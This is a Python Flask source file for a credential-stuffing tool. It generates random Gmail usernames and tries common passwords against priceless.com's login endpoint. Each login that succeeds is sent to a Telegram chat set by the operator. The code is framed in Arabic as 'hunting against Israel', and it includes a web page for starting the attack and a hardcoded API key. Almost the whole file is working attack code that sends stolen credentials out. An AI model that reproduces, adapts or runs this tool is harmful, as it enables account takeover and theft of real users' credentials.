from flask import Flask, render_template, request, jsonify
import requests
from faker import Faker
import telebot
import random
import os
import time
from rich import print
from rich.panel import Panel
from user_agent import generate_user_agent

app = Flask(__name__)

class Sin:
    def __init__(self, token, chat_id):
        self.TOKEN = token
        self.ID = chat_id
        self.bot = telebot.TeleBot(self.TOKEN)
        try:
            self.bot.send_message(chat_id=self.ID, text='تم بدء الصيد على اسرائيل')
        except telebot.apihelper.ApiException as e:
            print(f"Error sending message to Telegram: {e}")
            print("تأكد من أن chat_id صحيح وأن البوت قادر على الوصول إليه.")
            exit()

    def get_cookies(self):
        try:
            response = requests.get('https://www.priceless.com/m/profile/dashboard/account', headers={
                'User-Agent': generate_user_agent()
            })
            return response.cookies.get_dict()
        except Exception as e:
            print(f"Error fetching cookies: {e}")
            return None

    def login(self, email, password_list):
        url = "https://www.priceless.com/website/login"
        cookies = self.get_cookies()
        if not cookies:
            print("[red]Failed to fetch cookies. Retrying...")
            return

        headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'ar-AE,ar;q=0.9,en-IN;q=0.8,en;q=0.7,en-US;q=0.6',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.priceless.com',
            'Referer': 'https://www.priceless.com/m/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': generate_user_agent(),
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }
        for password in password_list:
            data = {
                'stk': cookies.get('stk', ''),
                'LoginForm[emailOptedIn]': '1',
                'LoginForm[username]': f'{email}@gmail.com',
                'LoginForm[password]': password,
            }
            try:
                response = requests.post(url, cookies=cookies, headers=headers, data=data, timeout=10)
                response_json = response.json()

                if response_json.get('result') == 0 and response_json.get('msg') == 'Incorrect email and/or password':
                    print(f'[red][<>] BAD ~ {email}@gmail.com ~ {password}')
                else:
                    print(f'[green][<>] GOOD ~ {email}@gmail.com ~ {password}')
                    self.bot.send_message(chat_id=self.ID, text=f'''
~~~~~~~
EMAIL : {email}@gmail.com
~~~~~~~
PASSWORD : {password}
~~~~~~
PY : @netxpop
                    ''')
            except requests.exceptions.RequestException as e:
                print(f"Request failed: {e}")

    def rand(self):
        password_list = ['123456', '1122334455', '1234567890', 'password', '123456789', '12345', '12345678', '123123', '111111', '1234567']
        print(Panel('[green]Hunting against Israel The tool was programmed by py @netxpop'))
        while True:
            try:
                faker = Faker('en')
                email = faker.user_name() + ''.join(random.choice('1234567890') for _ in range(random.randint(2, 9)))
                self.login(email, password_list)
                time.sleep(random.uniform(1, 3))
            except Exception as e:
                print(f"Error in rand function: {e}")

@app.route('/test', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        token = request.form.get('token')
        chat_id = request.form.get('chat_id')
        global ZXVN
        ZXVN = Sin(token, chat_id)
        return jsonify({"status": "success", "message": "Bot started successfully!"})
    return render_template('index.html')

@app.route('/start_hunt', methods=['POST'])
def start_hunt():
    ZXVN.rand()
    return jsonify({"status": "success", "message": "Hunt started successfully!"})

@app.route('/add_credentials', methods=['POST'])
def add_credentials():
    api_key = request.headers.get('APIKEY')
    if api_key != 'PEODPDOEEJEPDPRU0':
        return jsonify({"status": "error", "message": "Invalid API key"}), 403

    username = request.json.get('username')
    password = request.json.get('password')
    duration = request.json.get('duration')

    # Here you can add the logic to store the credentials and duration
    # For example, you can use a database or a simple list

    return jsonify({"status": "success", "message": "Credentials added successfully!"})

if __name__ == "__main__":
    app.run(debug=True)

# HTML Template as a string
html_template = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hunting Tool</title>
    <style>
        body {
            background: url('https://i.imgur.com/XYZ1234.gif') no-repeat center center fixed;
            background-size: cover;
            color: white;
            font-family: Arial, sans-serif;
        }
        .container {
            text-align: center;
            margin-top: 20%;
        }
        input {
            padding: 10px;
            margin: 10px;
            width: 200px;
        }
        button {
            padding: 10px 20px;
            margin: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Hunting Tool</h1>
        <input type="text" id="token" placeholder="Enter Telegram Token">
        <input type="text" id="chat_id" placeholder="Enter Telegram Chat ID">
        <button onclick="startBot()">Start Bot</button>
        <button onclick="startHunt()">Start Hunt</button>
    </div>
    <script>
        function startBot() {
            const token = document.getElementById('token').value;
            const chatId = document.getElementById('chat_id').value;
            fetch('/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `token=${token}&chat_id=${chatId}`
            }).then(response => response.json())
              .then(data => alert(data.message));
        }

        function startHunt() {
            fetch('/start_hunt', {
                method: 'POST'
            }).then(response => response.json())
              .then(data => alert(data.message));
        }
    </script>
</body>
</html>
'''

# Save the HTML template to a file
with open('templates/index.html', 'w') as file:
    file.write(html_template)
